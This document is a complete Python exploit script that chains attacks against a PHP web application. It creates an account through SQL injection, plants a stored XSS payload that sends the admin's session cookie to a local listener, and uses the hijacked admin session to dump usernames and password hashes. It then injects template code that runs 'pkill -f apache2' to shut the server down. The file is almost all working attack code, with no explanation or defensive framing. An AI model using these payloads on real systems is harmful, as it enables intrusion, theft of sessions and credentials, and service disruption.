import threading
import requests
import hashlib
import socket
import time
import sys
import re


if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <target> <username> <password>")
    sys.exit(-1)

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
description = "hacked"
host = 'localhost'
port = 9000

def create_user_sql_injection() -> None:
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    payload = f"'; INSERT INTO users (username, password, description) VALUES ('{username}', '{password_hash}', '{description}'); --"
    requests.post(f'http://{target}/forgotusername.php', {'username': payload})

def get_admin_session() -> requests.Session:
    cookie = None
    stop_event = threading.Event()
    
    def listen_for_cookie():
        nonlocal cookie
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))
            s.listen(1)
            conn, _ = s.accept()
            with conn:
                request = conn.recv(4096).decode()
                path = request.split(' ')[1][1:]
                if 'PHPSESSID=' in path:
                    cookie = path.split('PHPSESSID=')[1].split(';')[0].split('&')[0]
                    print(f'Captured admin session id: {cookie}')
                    stop_event.set()

    threading.Thread(target=listen_for_cookie, daemon=True).start()
    time.sleep(0.5)

    session = requests.Session()
    r = session.post(f'http://{target}/login.php', {'username': username, 'password': password})
    if 'Logged in' not in r.text:
        print('Login failed, account could not be created')
        sys.exit(-1)
    
    cookie_hijack = f"<script>fetch(`http://{host}:{port}/${{document.cookie}}`);</script>"
    r = session.post(f'http://{target}/profile.php', {'description': cookie_hijack})
    if 'Success' not in r.text:
        print('XSS failed')
        sys.exit(-1)
    
    if stop_event.wait(20):
        admin_session = requests.Session()
        admin_session.cookies.set('PHPSESSID', cookie)
        return admin_session

    print('Failed to capture admin cookie')
    sys.exit(-1)


def get_users(admin_session: requests.Session) -> None:
    response = admin_session.get(f'http://{target}/index.php')
    
    if 'Admin Section' in response.text:
        user_pattern = r'<tr><td>(\d+)</td><td>([^<]+)</td><td>([^<]+)</td><td>(.*?)</td></tr>'
        users = re.findall(user_pattern, response.text, re.DOTALL)
        
        print(f"\n{'ID':<3} {'Username':<9} {'Password Hash':<67} {'Description'}")
        print("-" * 150)
        for uid, username, password_hash, description in users:
            clean_desc = description.strip()
            if len(clean_desc) > 68:
                clean_desc = clean_desc[:60] + "..."
            clean_desc = clean_desc.replace('\n', '\\n').replace('\t', '\\t')
            print(f'{uid:<3} {username:<9} {password_hash:<67} {clean_desc}')
    else:
        print('User is not admin')
        sys.exit(-1)


def inject_shutdown_rce(admin_session: requests.Session) -> None:
    code = "{php}exec('pkill -f apache2');{/php}"
    admin_session.post(f'http://{target}/admin/update_motd.php', data={'message': code})


if '__main__' == __name__:
    print('Creating user via SQL injection...')
    create_user_sql_injection()

    print('Getting admin session via XSS and cookie hijack (20 seconds timeout)...')
    admin_session = get_admin_session()

    get_users(admin_session)
    
    print('\nInjecting RCE to shutdown apache server...')
    inject_shutdown_rce(admin_session)

    print('Trying to get users after RCE...')
    try:
        get_users(admin_session)
    except requests.exceptions.ConnectionError:
        print('Server is down.')
